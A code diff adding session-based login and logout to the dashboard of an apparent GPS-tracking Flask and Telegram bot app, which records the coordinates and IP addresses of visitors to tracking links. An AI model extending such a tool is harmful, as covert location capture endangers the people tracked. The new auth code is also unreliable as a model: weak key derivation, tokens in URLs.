@@ -12,7 +12,7 @@ import asyncio
 import base64
 from io import BytesIO
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
@@ -285,6 +285,7 @@ async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
 # ============ FLASK ============
 app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))
 app.config['TEMPLATES_AUTO_RELOAD'] = True
+app.secret_key = hashlib.sha256(f"gps-tracker-{BOT_TOKEN}-secret".encode()).hexdigest()
 
 @app.after_request
 def skip_ngrok(response):
@@ -329,17 +330,46 @@ def map_view(tid):
     evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
     return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)
 
+def is_authenticated():
+    """Check if user is authenticated via session or URL token"""
+    if session.get("dashboard_authenticated"):
+        return True
+    token = request.args.get("token", "")
+    if token == DASHBOARD_TOKEN:
+        session["dashboard_authenticated"] = True
+        session.permanent = False
+        return True
+    return False
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        data = request.get_json(silent=True) or {}
+        password = data.get("password", "")
+        if password == DASHBOARD_TOKEN:
+            session["dashboard_authenticated"] = True
+            session.permanent = False
+            return jsonify({"success": True, "redirect": "/dashboard"})
+        return jsonify({"success": False, "message": "Password salah"}), 401
+    # GET: show login page
+    if session.get("dashboard_authenticated"):
+        return redirect(url_for("dashboard"))
+    return render_template("login.html")
+
+@app.route("/logout")
+def logout():
+    session.pop("dashboard_authenticated", None)
+    return redirect("/login")
+
 @app.route("/dashboard")
 def dashboard():
-    token = request.args.get("token", "")
-    if token != DASHBOARD_TOKEN:
-        return render_template("error.html", message="Akses ditolak. Token dashboard salah atau tidak disertakan."), 403
-    return render_template("dashboard.html", token=token)
+    if not is_authenticated():
+        return redirect("/login")
+    return render_template("dashboard.html", token=DASHBOARD_TOKEN)
 
 @app.route("/api/dashboard")
 def api_dashboard():
-    token = request.args.get("token", "")
-    if token != DASHBOARD_TOKEN:
+    if not is_authenticated():
         return jsonify({"error": "unauthorized"}), 403
 
     import datetime
